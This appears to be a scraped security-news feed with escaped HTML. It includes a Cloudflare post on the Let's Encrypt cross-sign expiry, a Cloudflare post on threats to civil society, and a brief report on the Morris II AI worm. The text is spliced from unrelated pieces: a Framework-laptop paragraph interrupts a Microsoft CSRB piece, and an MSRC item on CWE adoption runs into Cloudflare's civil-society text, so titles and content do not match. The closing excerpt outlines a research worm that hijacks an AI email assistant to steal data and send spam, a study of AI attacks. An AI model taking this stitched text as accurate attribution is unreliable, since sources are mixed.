&lt;p&gt;Despite the angst among policymakers, security experts, and competitors, Microsoft faced no consequences for its latest embarrassing failure. The United States government kept buying and using Microsoft products, and senior officials refused to publicly rebuke the tech giant. It was another reminder of how insulated Microsoft has become from virtually any government accountability, even as the Biden administration vows to make powerful tech firms take more responsibility for America’s cyber defense.&lt;/p&gt;

      &lt;/figure&gt;
That state of affairs is unlikely to change even in the wake of &lt;a href="https://www.cisa.gov/sites/default/files/2024-04/CSRB_Review_of_the_Summer_2023_MEO_Intrusion_Final_508c.pdf"&gt;a new report&lt;/a&gt; by the Cyber Safety Review Board (CSRB), a group of government and industry experts, which lambasts Microsoft for failing to prevent one of the worst hacking incidents in the company’s recent history.

&lt;p&gt;Not that the company's hardware releases to date have been perfect—each Framework Laptop 13 model has had quirks and flaws that range from &lt;a href="https://knowledgebase.frame.work/expansion-card-functionality-on-framework-laptop-13-amd-ryzen-7040-series-SkrVx7gAh"&gt;minor&lt;/a&gt; to &lt;a href="https://arstechnica.com/gadgets/2022/07/review-frameworks-next-gen-laptop-follows-through-on-its-upgradeable-promises/4/"&gt;quite significant&lt;/a&gt;, and the &lt;a href="https://arstechnica.com/gadgets/2024/01/review-frameworks-laptop-16-is-unique-laudable-fascinating-and-flawed/"&gt;Laptop 16's&lt;/a&gt; upsides struggle to balance its downsides. But the hardware mostly does a good job of functioning as a regular laptop while being much more tinkerer-friendly than your typical MacBook, XPS, or ThinkPad.&lt;/p&gt;

This will affect legacy devices with outdated trust stores (Android versions 7.1.1 or older). To prevent this change from impacting customers, Cloudflare will shift Let’s Encrypt certificates upon renewal to use a different CA</description><content:encoded>&lt;p&gt;&lt;/p&gt;
            &lt;figure&gt;
            
            &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7xrPBUpEjsmaBkRYhxiRIr/c95f42fffef36c7d595422b4724c8665/Untitled--3--1.png" /&gt;
            
            &lt;/figure&gt;&lt;p&gt;&lt;a href="https://letsencrypt.org/"&gt;Let’s Encrypt&lt;/a&gt;, a publicly trusted certificate authority (CA) that Cloudflare uses to issue TLS certificates, has been relying on two distinct certificate chains. One is cross-signed with &lt;a href="https://www.identrust.com/"&gt;IdenTrust&lt;/a&gt;, a globally trusted CA that has been around since 2000, and the other is Let’s Encrypt’s own root CA, ISRG Root X1. Since Let’s Encrypt launched, &lt;a href="https://letsencrypt.org/certificates/#root-certificates"&gt;ISRG Root X1&lt;/a&gt; has been steadily gaining its own device compatibility.&lt;/p&gt;&lt;p&gt;On September 30, 2024, Let’s Encrypt’s certificate chain cross-signed with IdenTrust will &lt;a href="https://letsencrypt.org/2023/07/10/cross-sign-expiration.html"&gt;expire&lt;/a&gt;. After the cross-sign expires, servers will no longer be able to serve certificates signed by the cross-signed chain. Instead, all Let’s Encrypt certificates will use the ISRG Root X1 CA.&lt;/p&gt;&lt;p&gt;Most devices and browser versions released after 2016 will not experience any issues as a result of the change since the ISRG Root X1 will already be installed in those clients’ trust stores. That's because these modern browsers and operating systems were built to be agile and flexible, with upgradeable trust stores that can be updated to include new certificate authorities.&lt;/p&gt;&lt;p&gt;The change in the certificate chain will impact legacy devices and systems, such as devices running Android version 7.1.1 (released in 2016) or older, as those exclusively rely on the cross-signed chain and lack the ISRG X1 root in their trust store. These clients will encounter TLS errors or warnings when accessing domains secured by a Let’s Encrypt certificate. We took a look at the data ourselves and found that, of all Android requests, 2.96% of them come from devices that will be affected by the change. That’s a substantial portion of traffic that will lose access to the Internet. We’re committed to keeping those users online and will modify our certificate pipeline so that we can continue to serve users on older devices without requiring any manual modifications from our customers.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;A better Internet, for everyone&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#a-better-internet-for-everyone"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;In the past, we invested in efforts like &lt;a href="https://blog.cloudflare.com/sha-1-deprecation-no-browser-left-behind/"&gt;“No Browsers Left Behind”&lt;/a&gt; to help ensure that we could continue to support clients as SHA-1 based algorithms were being deprecated. Now, we’re applying the same approach for the upcoming Let’s Encrypt change.&lt;/p&gt;&lt;p&gt;We have made the decision to remove Let’s Encrypt as a certificate authority from all flows where Cloudflare dictates the CA, impacting Universal SSL customers and those using SSL for SaaS with the “default CA” choice.&lt;/p&gt;&lt;p&gt;Starting in June 2024, one certificate lifecycle (90 days) before the cross-sign chain expires, we’ll begin migrating Let’s Encrypt certificates that are up for renewal to use a different CA, one that ensures compatibility with older devices affected by the change. That means that going forward, customers will only receive Let’s Encrypt certificates if they explicitly request Let’s Encrypt as the CA.&lt;/p&gt;&lt;p&gt;The change that Let's Encrypt is making is a necessary one. For us to move forward in supporting new standards and protocols, we need to make the Public Key Infrastructure (PKI) ecosystem more agile. By retiring the cross-signed chain, Let’s Encrypt is pushing devices, browsers, and clients to support adaptable trust stores.&lt;/p&gt;&lt;p&gt;However, we’ve observed &lt;a href="https://blog.cloudflare.com/sha-1-deprecation-no-browser-left-behind/"&gt;changes like this in the past&lt;/a&gt; and while they push the adoption of new standards, they disproportionately impact users in economically disadvantaged regions, where access to new technology is limited.&lt;/p&gt;&lt;p&gt;Our mission is to help build a better Internet and that means supporting users worldwide. We previously published a &lt;a href="https://blog.cloudflare.com/upcoming-lets-encrypt-certificate-chain-change-and-impact-for-cloudflare-customers"&gt;blog post about the Let’s Encrypt change&lt;/a&gt;, asking customers to switch their certificate authority if they expected any impact. However, determining the impact of the change is challenging. Error rates due to trust store incompatibility are primarily logged on clients, reducing the visibility that domain owners have. In addition, while there might be no requests incoming from incompatible devices today, it doesn’t guarantee uninterrupted access for a user tomorrow.&lt;/p&gt;&lt;p&gt;Cloudflare’s certificate pipeline has evolved over the years to be resilient and flexible, allowing us to seamlessly adapt to changes like this without any negative impact to our customers.  &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;How Cloudflare has built a robust TLS certificate pipeline&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#how-cloudflare-has-built-a-robust-tls-certificate-pipeline"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Today, Cloudflare manages tens of millions of certificates on behalf of customers. For us, a successful pipeline means:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;p&gt;Customers can always obtain a TLS certificate for their domain&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;CA related issues have zero impact on our customer’s ability to obtain a certificate&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;The best security practices and modern standards are utilized&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Optimizing for future scale&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Supporting a wide range of clients and devices&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;Every year, we introduce new optimizations into our certificate pipeline to maintain the highest level of service. Here’s how we do it…&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Ensuring customers can always obtain a TLS certificate for their domain&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#ensuring-customers-can-always-obtain-a-tls-certificate-for-their-domain"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Since the launch of Universal SSL in 2014, Cloudflare has been responsible for issuing and serving a TLS certificate for every domain that’s protected by our network. That might seem trivial, but there are a few steps that have to successfully execute in order for a domain to receive a certificate:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;p&gt;Domain owners need to complete &lt;a href="https://developers.cloudflare.com/ssl/edge-certificates/changing-dcv-method/"&gt;Domain Control Validation&lt;/a&gt; for every certificate issuance and renewal.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;The certificate authority needs to verify the Domain Control Validation tokens to issue the certificate.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href="https://developers.cloudflare.com/ssl/edge-certificates/troubleshooting/caa-records/"&gt;CAA records&lt;/a&gt;, which dictate which CAs can be used for a domain, need to be checked to ensure only authorized parties can issue the certificate.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;The certificate authority must be available to issue the certificate.&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;Each of these steps requires coordination across a number of parties — domain owners, CDNs, and certificate authorities. At Cloudflare, we like to be in control when it comes to the success of our platform. That’s why we make it our job to ensure each of these steps can be successfully completed.&lt;/p&gt;&lt;p&gt;We ensure that every certificate issuance and renewal requires minimal effort from our customers. To get a certificate, a domain owner has to complete Domain Control Validation (DCV) to prove that it does in fact own the domain. Once the certificate request is initiated, the CA will return DCV tokens which the domain owner will need to place in a DNS record or an HTTP token. If you’re using Cloudflare as your DNS provider, Cloudflare completes DCV on your behalf by automatically placing the TXT token returned from the CA into your DNS records. Alternatively, if you use an external DNS provider, we offer the option to &lt;a href="https://blog.cloudflare.com/introducing-dcv-delegation/"&gt;Delegate DCV&lt;/a&gt; to Cloudflare for automatic renewals without any customer intervention.&lt;/p&gt;&lt;p&gt;Once DCV tokens are placed, Certificate Authorities (CAs) verify them. CAs conduct this &lt;a href="https://blog.cloudflare.com/secure-certificate-issuance"&gt;verification from multiple vantage points&lt;/a&gt; to prevent spoofing attempts. However, since these checks are done from multiple countries and ASNs (Autonomous Systems), they may trigger a Cloudflare WAF rule which can cause the DCV check to get blocked. We made sure to update our WAF and security engine to recognize that these requests are coming from a CA to ensure they're never blocked so DCV can be successfully completed.&lt;/p&gt;&lt;p&gt;Some customers have CA preferences, due to internal requirements or compliance regulations. To prevent an unauthorized CA from issuing a certificate for a domain, the domain owner can create a Certification Authority Authorization (CAA) DNS record, specifying which CAs are allowed to issue a certificate for that domain. To ensure that customers can always obtain a certificate, we check the CAA records before requesting a certificate to know which CAs we should use. If the CAA records block all of the &lt;a href="https://developers.cloudflare.com/ssl/reference/certificate-authorities/"&gt;CAs that are available&lt;/a&gt; in Cloudflare’s pipeline and the customer has not uploaded a certificate from the CA of their choice, then we add CAA records on our customers’ behalf to ensure that they can get a certificate issued. Where we can, we optimize for preference. Otherwise, it’s our job to prevent an outage by ensuring that there’s always a TLS certificate available for the domain, even if it does not come from a preferred CA.&lt;/p&gt;&lt;p&gt;Today, Cloudflare is not a publicly trusted certificate authority, so we rely on the CAs that we use to be highly available. But, 100% uptime is an unrealistic expectation. Instead, our pipeline needs to be prepared in case our CAs become unavailable.&lt;/p&gt;&lt;h4&gt;Ensuring that CA-related issues have zero impact on our customer’s ability to obtain a certificate&lt;/h4&gt;&lt;p&gt;At Cloudflare, we like to think ahead, which means preventing incidents before they happen. It’s not uncommon for CAs to become unavailable — sometimes this happens because of an outage, but more commonly, CAs have maintenance periods every so often where they become unavailable for some period of time.&lt;/p&gt;&lt;p&gt;It’s our job to ensure CA redundancy, which is why we always have multiple CAs ready to issue a certificate, ensuring high availability at all times. If you've noticed different CAs issuing your Universal SSL certificates, that's intentional. We evenly distribute the load across our CAs to avoid any single point of failure. Plus, we keep a close eye on latency and error rates to detect any issues and automatically switch to a different CA that's available and performant. You may not know this, but one of our CAs has around 4 scheduled maintenance periods every month. When this happens, our automated systems kick in seamlessly, keeping everything running smoothly. This works so well that our internal teams don’t get paged anymore because everything &lt;i&gt;just works.&lt;/i&gt;&lt;/p&gt;&lt;h4&gt;Adopting best security practices and modern standards  &lt;/h4&gt;&lt;p&gt;Security has always been, and will continue to be, Cloudflare’s top priority, and so maintaining the highest security standards to safeguard our customer’s data and private keys is crucial.&lt;/p&gt;&lt;p&gt;Over the past decade, the &lt;a href="https://cabforum.org/"&gt;CA/Browser Forum&lt;/a&gt; has advocated for reducing certificate lifetimes from 5 years to 90 days as the industry norm. This shift helps minimize the risk of a key compromise. When certificates are renewed every 90 days, their private keys remain valid for only that period, reducing the window of time that a bad actor can make use of the compromised material.&lt;/p&gt;&lt;p&gt;We fully embrace this change and have made 90 days the default certificate validity period. This enhances our security posture by ensuring regular key rotations, and has pushed us to develop tools like DCV Delegation that promote &lt;a href="https://www.cloudflare.com/application-services/solutions/certificate-lifecycle-management/"&gt;automation&lt;/a&gt; around frequent certificate renewals, without the added overhead. It’s what enables us to offer certificates with validity periods as low as two weeks, for customers that want to rotate their private keys at a high frequency without any concern that it will lead to certificate renewal failures.&lt;/p&gt;&lt;p&gt;Cloudflare has always been at the forefront of new protocols and standards. &lt;a href="https://www.cloudflare.com/press-releases/2014/cloudflare-offers-the-industrys-first-universal-ssl-for-free/"&gt;It’s no secret&lt;/a&gt; that when we support a new protocol, adoption skyrockets. This month, we will be adding &lt;a href="https://blog.cloudflare.com/ecdsa-the-digital-signature-algorithm-of-a-better-internet"&gt;ECDSA&lt;/a&gt; support for certificates issued from &lt;a href="https://pki.goog/"&gt;Google Trust Services&lt;/a&gt;. With &lt;a href="https://www.cloudflare.com/learning/dns/dnssec/ecdsa-and-dnssec/"&gt;ECDSA&lt;/a&gt;, you get the same level of security as RSA but with smaller keys. Smaller keys mean smaller certificates and less data passed around to establish a TLS connection, which results in quicker connections and faster loading times.&lt;/p&gt;&lt;h4&gt;Optimizing for future scale&lt;/h4&gt;&lt;p&gt;Today, Cloudflare issues almost 1 million certificates per day. With the recent shift towards shorter certificate lifetimes, we continue to improve our pipeline to be more robust. But even if our pipeline can handle the significant load, we still need to rely on our CAs to be able to scale with us. With every CA that we integrate, we instantly become one of their biggest consumers. We hold our CAs to high standards and push them to improve their infrastructure to scale. This doesn’t just benefit Cloudflare’s customers, but it helps the Internet by requiring CAs to handle higher volumes of issuance.&lt;/p&gt;&lt;p&gt;And now, with Let’s Encrypt shortening their chain of trust, we’re going to add an additional improvement to our pipeline — one that will ensure the best device compatibility for all.&lt;/p&gt;&lt;h4&gt;Supporting all clients — legacy and modern&lt;/h4&gt;&lt;p&gt;The upcoming Let’s Encrypt change will prevent legacy devices from making requests to domains or applications that are protected by a Let’s Encrypt certificate. We don’t want to cut off Internet access from any part of the world, which means that we’re going to continue to provide the best device compatibility to our customers, despite the change.&lt;/p&gt;&lt;p&gt;Because of all the recent enhancements, we are able to reduce our reliance on Let’s Encrypt without impacting the reliability or quality of service of our certificate pipeline. One certificate lifecycle (90 days) before the change, we are going to start shifting certificates to use a different CA, one that’s compatible with the devices that will be impacted. By doing this, we’ll mitigate any impact without any action required from our customers. The only customers that will continue to use Let’s Encrypt are ones that have specifically chosen Let’s Encrypt as the CA.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;What to expect of the upcoming Let’s Encrypt change&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#what-to-expect-of-the-upcoming-lets-encrypt-change"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Let’s Encrypt’s cross-signed chain will &lt;a href="https://letsencrypt.org/2023/07/10/cross-sign-expiration.html"&gt;expire&lt;/a&gt; on September 30th, 2024. Although Let’s Encrypt plans to stop issuing certificates from this chain on June 6th, 2024, Cloudflare will continue to serve the cross-signed chain for all Let’s Encrypt certificates until September 9th, 2024.&lt;/p&gt;&lt;p&gt;90 days or one certificate lifecycle before the change, we are going to start shifting Let’s Encrypt certificates to use a different certificate authority. We’ll make this change for all products where Cloudflare is responsible for the CA selection, meaning this will be automatically done for customers using Universal SSL and SSL for SaaS with the “default CA” choice.&lt;/p&gt;&lt;p&gt;Any customers that have specifically chosen Let’s Encrypt as their CA will receive an email notification with a list of their Let’s Encrypt certificates and information on whether or not we’re seeing requests on those hostnames coming from legacy devices.&lt;/p&gt;&lt;p&gt;After September 9th, 2024, Cloudflare will serve all Let’s Encrypt certificates using the ISRG Root X1 chain. Here is what you should expect based on the certificate product that you’re using:&lt;/p&gt;&lt;h4&gt;Universal SSL&lt;/h4&gt;&lt;p&gt;With &lt;a href="https://developers.cloudflare.com/ssl/edge-certificates/universal-ssl/"&gt;Universal SSL&lt;/a&gt;, Cloudflare chooses the CA that is used for the domain’s certificate. This gives us the power to choose the best certificate for our customers. &lt;b&gt;If you are using Universal SSL, there are no changes for you to make to prepare for this change&lt;/b&gt;. Cloudflare will automatically shift your certificate to use a more compatible CA.&lt;/p&gt;&lt;h4&gt;Advanced Certificates&lt;/h4&gt;&lt;p&gt;With &lt;a href="https://developers.cloudflare.com/ssl/edge-certificates/advanced-certificate-manager/"&gt;Advanced Certificate Manager&lt;/a&gt;, customers specifically choose which CA they want to use. If Let’s Encrypt was specifically chosen as the CA for a certificate, we will respect the choice, because customers may have specifically chosen this CA due to internal requirements, or because they have implemented certificate pinning, which we highly discourage.&lt;/p&gt;&lt;p&gt;If we see that a domain using an Advanced certificate issued from Let’s Encrypt will be impacted by the change, then we will send out email notifications to inform those customers which certificates are using Let’s Encrypt as their CA and whether or not those domains are receiving requests from clients that will be impacted by the change. Customers will be responsible for changing the CA to another provider, if they chose to do so.&lt;/p&gt;&lt;h4&gt;SSL for SaaS&lt;/h4&gt;&lt;p&gt;With &lt;a href="https://developers.cloudflare.com/cloudflare-for-platforms/cloudflare-for-saas/security/certificate-management/"&gt;SSL for SaaS&lt;/a&gt;, customers have two options: using a default CA, meaning Cloudflare will choose the issuing authority, or specifying which CA to use.&lt;/p&gt;&lt;p&gt;If you’re leaving the CA choice up to Cloudflare, then we will automatically use a CA with higher device compatibility.&lt;/p&gt;&lt;p&gt;If you’re specifying a certain CA for your custom hostnames, then we will respect that choice. We will send an email out to SaaS providers and platforms to inform them which custom hostnames are receiving requests from legacy devices. Customers will be responsible for changing the CA to another provider, if they chose to do so.&lt;/p&gt;&lt;h4&gt;Custom Certificates&lt;/h4&gt;&lt;p&gt;If you directly integrate with Let’s Encrypt and use &lt;a href="https://developers.cloudflare.com/ssl/edge-certificates/custom-certificates/"&gt;Custom Certificates&lt;/a&gt; to upload your Let’s Encrypt certs to Cloudflare then your certificates will be bundled with the cross-signed chain, as long as you choose the bundle method “&lt;a href="https://developers.cloudflare.com/ssl/edge-certificates/custom-certificates/bundling-methodologies/#compatible"&gt;compatible&lt;/a&gt;” or “&lt;a href="https://developers.cloudflare.com/ssl/edge-certificates/custom-certificates/bundling-methodologies/#modern"&gt;modern&lt;/a&gt;” and upload those certificates before September 9th, 2024. After September 9th, we will bundle all Let’s Encrypt certificates with the ISRG Root X1 chain. With the “&lt;a href="https://developers.cloudflare.com/ssl/edge-certificates/custom-certificates/bundling-methodologies/#user-defined"&gt;user-defined&lt;/a&gt;” bundle method, we always serve the chain that’s uploaded to Cloudflare. If you upload Let’s Encrypt certificates using this method, you will need to ensure that certificates uploaded after September 30th, 2024, the date of the CA expiration, contain the right certificate chain.&lt;/p&gt;&lt;p&gt;In addition, if you control the clients that are connecting to your application, we recommend updating the trust store to include the &lt;a href="https://letsencrypt.org/certificates/#root-certificates"&gt;ISRG Root X1&lt;/a&gt;. If you use certificate pinning, remove or update your pin. In general, we discourage all customers from pinning their certificates, as this usually leads to issues during certificate renewals or CA changes.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Conclusion&lt;/h2&gt;

            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Internet standards will continue to evolve and improve. As we support and embrace those changes, we also need to recognize that it’s our responsibility to keep users online and to maintain Internet access in the parts of the world where new technology is not readily available. By using Cloudflare, you always have the option to choose the setup that’s best for your application.&lt;/p&gt;&lt;p&gt;For additional information regarding the change, please refer to our &lt;a href="https://developers.cloudflare.com/ssl/reference/migration-guides/lets-encrypt-chain/"&gt;developer documentation&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">ymep6DaFvevM4m2AIdw5F</guid><category>Security</category><category>Application Services</category><category>TLS</category><category>SSL</category><category>Certificate Authority</category><category>Deep Dive</category></item><item><title>Toward greater transparency:  Adopting the CWE standard for Microsoft CVEs</title><link>https://msrc.microsoft.com/blog/2024/04/toward-greater-transparency-adopting-the-cwe-standard-for-microsoft-cves/</link><description>At the Microsoft Security Response Center (MSRC), our mission is to protect our customers, communities, and Microsoft from current and emerging threats to security and privacy.

            &lt;/figure&gt;&lt;p&gt;Internet security and reliability has become deeply personal. This holds true for many of us, but especially those who work with vulnerable communities, political dissidents, journalists in authoritarian nations, or human rights advocates. The threats they face, both in the physical world and online, are &lt;a href="https://reliefweb.int/report/world/civil-society-should-be-defended-other-critical-infrastructure"&gt;steadily increasing&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;At Cloudflare, our mission is to help build a better Internet. With many of our &lt;a href="https://www.cloudflare.com/impact/"&gt;Impact projects&lt;/a&gt;, which protect a range of vulnerable voices from civil society, journalists, state and local governments that run elections, political campaigns, political parties, community networks, and more, we’ve learned how to keep these important groups secure online. But, we can’t do it alone. Collaboration and sharing of best practices with multiple stakeholders to get the right tools into the groups that need them is essential in democratizing access to powerful security tools.&lt;/p&gt;&lt;p&gt;Civil society has historically been the voice for sharing information about attacks that target vulnerable communities, both online and offline. In the last few years, we see governments increasingly appreciating how cyberattacks affect vulnerable voices and make an effort to identify the risks to these communities, and the resources available to protect them.&lt;/p&gt;&lt;p&gt;In March 2023, the US government launched the &lt;a href="https://www.state.gov/summit-for-democracy-2023/"&gt;Summit for Democracy&lt;/a&gt; co-hosted by Costa Rica, Zambia, the Netherlands, and South Korea. We’ve written about our &lt;a href="https://blog.cloudflare.com/cloudflare-commitment-to-the-2023-summit-for-democracy/"&gt;work at the summit and commitments&lt;/a&gt; on a wide range of actions to help advance human rights online. We were also proud to be included in US Agency for International Development's (USAID) announcement, as part of the second summit in South Korea in March 2024, as a potential technology partner for the &lt;a href="https://www.whitehouse.gov/briefing-room/statements-releases/2024/03/20/fact-sheet-delivering-on-the-biden-harris-administrations-commitment-to-democratic-renewal-at-the-third-summit-for-democracy/"&gt;Advancing Digital Democracy Academy&lt;/a&gt; initiative, which will offer skills training in cybersecurity, cloud computing, responsible AI to support governments, civil society organizations, and other vulnerable groups.&lt;/p&gt;&lt;p&gt;With multistakeholder collaboration a growing effort, we want to give you insight into our ongoing efforts with the US Cybersecurity and Infrastructure Security Agency through the &lt;a href="https://www.cisa.gov/topics/partnerships-and-collaboration/joint-cyber-defense-collaborative"&gt;Joint Cyber Defense Collaborative&lt;/a&gt; (JCDC) to work together to raise awareness about threats to civil society, best practices that groups can use to protect themselves online today, and new resources developed for these vulnerable communities.&lt;/p&gt;
            &lt;figure&gt;
            
            &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1jxv9myiiecqO3aY4RAIW8/1052c3fe1002edca3c1dbca61d567ebb/Screenshot-2024-03-28-at-21.16.13.png" /&gt;
            
            &lt;/figure&gt;
          &lt;div&gt;
            &lt;h3&gt;What types of threats do civil society organizations face?&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#what-types-of-threats-do-civil-society-organizations-face"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Civil society organizations, which include non-governmental organizations, community-based organizations, and advocacy groups, face a wide range of threats and challenges that can vary depending on their location, focus areas, and activities. These threats can come from various sources, offline and online, from governments, non-state actors, and external influences.  &lt;/p&gt;&lt;p&gt;Since our founding, we’ve provided a set of free services based on the idea that democratizing access to cybersecurity products makes the Internet safer and faster for a broader audience. Since 2014, we’ve continued to strengthen this idea with &lt;a href="https://www.cloudflare.com/galileo/"&gt;Project Galileo&lt;/a&gt;, providing a higher level of protection to vulnerable voices. Fast forward to 2024, and we now protect more than 2,600 organizations in 111 countries under Project Galileo, allowing us to gain a better understanding of threats these organizations face on a daily basis. In June 2023, we &lt;a href="https://radar.cloudflare.com/reports/project-galileo-9th-anniv"&gt;published a report&lt;/a&gt; showing that between July 1, 2022, and May 5, 2023, Cloudflare mitigated 20 billion attacks against organizations protected under the project, an average of nearly 67.7 million cyber attacks per day over the 10 month period.&lt;/p&gt;&lt;p&gt;We continue to learn more about cyberattacks against these groups and how to better equip them with the tools they need to stay online. Our &lt;a href="https://blog.cloudflare.com/ddos-threat-report-2023-q2/"&gt;Q2 2023 DDoS report&lt;/a&gt;, for example, noted that 17.6% of all traffic to nonprofits was DDoS traffic, and that nonprofits were the second most targeted sector for DDoS. In addition, we see prominent civil society organizations, like our partner the International Press Institute, fall victim to a cyber attack after &lt;a href="https://ipi.media/cyberattack-on-ipi-evidence-points-to-retaliation-for-press-freedom-work-in-hungary/"&gt;releasing a report&lt;/a&gt; identifying multiple DDoS attacks against many independent media outlets in Hungary over a five month period.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;What do these attacks look like for a civil society organization?&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#what-do-these-attacks-look-like-for-a-civil-society-organization"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;It is easy to provide overall statistics on the number of cyber attacks we see against organizations under Project Galileo. But that doesn't provide the whole story on what attacks look like in practice or how organizations can defend against them in real time.&lt;/p&gt;&lt;p&gt;When we were developing our &lt;a href="https://radar.cloudflare.com/reports/project-galileo-9th-anniv"&gt;Radar dashboard for the 9th anniversary&lt;/a&gt; of Project Galileo, we came across a noteworthy incident that involved an organization reporting on international legal issues, which highlights the importance of having security measures in place, even for organizations that do not believe they are a target. This event occurred between March 17 and March 18, 2023. On March 17, an international arrest warrant was issued for Russian President Vladimir Putin and Russian official Maria Lvova-Belova in connection with an alleged plot to relocate Ukrainian children to Russia.&lt;/p&gt;
            &lt;figure&gt;
            
            &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1UsaUGKFXABdhjouR70qX4/d5db6028371e80bdea5e139586011ed7/attackcivil.png" /&gt;
            
            &lt;/figure&gt;&lt;p&gt;Before and after this incident, the organization's website experienced low levels of traffic. However, on March 17, we observed a sudden surge in request traffic, escalating from under 1,000 requests per second to approximately 100,000 requests per second within a four-hour window, reaching its peak at 19:00 UTC. Fortunately, the majority of this traffic was effectively managed by our Web Application Firewall. Another notable spike occurred on March 18, with the peak occurring at 09:45 UTC, surpassing 667,000 requests per second. Almost all of these requests were identified as Distributed Denial of Service (DDoS) attacks, as illustrated in the chart above. Throughout March 18, Cloudflare successfully thwarted a total of 844.4 million requests categorized as application layer DDoS attacks.&lt;/p&gt;&lt;p&gt;This incident highlights a recurring theme that we encounter within Project Galileo. Many organizations may remain unaware of their vulnerability to cyberattacks until their website is targeted by a disruptive DDoS attack. In this instance, the organization maintained its online presence throughout the entire attack, likely only discovering the abnormal surge in traffic after the attack had subsided.&lt;/p&gt;&lt;p&gt;This is just one example of an attack targeting an organization under Project Galileo, but they happen every day. But don’t just take it from us, check out more &lt;a href="https://www.cloudflare.com/project-galileo-case-studies/"&gt;stories from organizations&lt;/a&gt; on how they stay secure online.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Collaborating with CISA through the Joint Cyber Defense Collaborative to identify how to get our services to more vulnerable communities&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#collaborating-with-cisa-through-the-joint-cyber-defense-collaborative-to-identify-how-to-get-our-services-to-more-vulnerable-communities"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;One of the ways we expand our protections with Project Galileo is through partnerships and collaborations. We currently work with more than 50 civil society organizations who approve organizations for protection under Project Galileo. The role of our civil society partners is essential as they have the knowledge and expertise around organizations that need these types of services.&lt;/p&gt;&lt;p&gt;When JCDC reached out to us about an initiative focused on protecting vulnerable communities online, we were excited to help make resources more accessible from a trusted voice. As governments increasingly identify the need for cybersecurity services for vulnerable communities, they have the ability to make these resources accessible and bring together multiple stakeholders to help promote best security practices. With JCDC, we are collaborating on three working groups to cover a range of topics that include crowdsourcing resources available for at-risk communities, developing new resources for these groups, cyber volunteer programs from companies and civil society, information sharing and development of threat reports and more.&lt;/p&gt;&lt;p&gt;With a range of stakeholders including civil society, tech companies, and CISA, we’ve been able to identify opportunities to build capacity and transparency strategies when it comes to extending products to these communities. We hope that other governments can see these efforts on providing protections to vulnerable communities as a model for effective collaboration.&lt;/p&gt;

        &lt;p&gt;As part of our working groups with JCDC, we focused on enhancing the baseline of cyber hygiene for civil society organizations and improving resilience and response capabilities in the face of a cyberattack.

        &lt;p&gt;There is still a lot of work to be done when it comes to protecting vulnerable voices. We hope that by collaborating with a range of stakeholders from governments, civil society, and tech companies we can better share tools and expertise to help these communities navigate the complex digital environments we find ourselves in.

Startups and tech companies are building AI agents and ecosystems on top of the systems that can &lt;a href="https://www.wired.com/story/ai-chatbots-chatgpt-boring-chores/"&gt;complete boring chores for you&lt;/a&gt;: think automatically making calendar bookings and potentially &lt;a href="https://www.wired.com/story/fast-forward-tested-next-gen-ai-assistant/"&gt;buying products&lt;/a&gt;. But as the tools are given more freedom, it also increases the potential ways they can be attacked.&lt;/p&gt;
&lt;p&gt;Now, in a demonstration of the risks of connected, autonomous AI ecosystems, a group of researchers has created one of what they claim are the first generative AI worms—which can spread from one system to another, potentially stealing data or deploying malware in the process. “It basically means that now you have the ability to conduct or to perform a new kind of cyberattack that hasn't been seen before,” says Ben Nassi, a Cornell Tech researcher behind the research.&lt;/p&gt;
&lt;p&gt;Nassi, along with fellow researchers Stav Cohen and Ron Bitton, created the worm, dubbed Morris II, as a nod to the original &lt;a href="https://www.wired.com/2011/07/0726first-computer-fraud-indictment/"&gt;Morris computer worm&lt;/a&gt; that caused chaos across the Internet in 1988. In a &lt;a href="https://sites.google.com/view/compromptmized"&gt;research paper and website &lt;/a&gt;shared exclusively with WIRED, the researchers show how the AI worm can attack a generative AI email assistant to steal data from emails and send spam messages—breaking some security protections in ChatGPT and Gemini in the process.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/ai/2024/03/researchers-create-ai-worms-that-can-spread-from-one-system-to-another/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

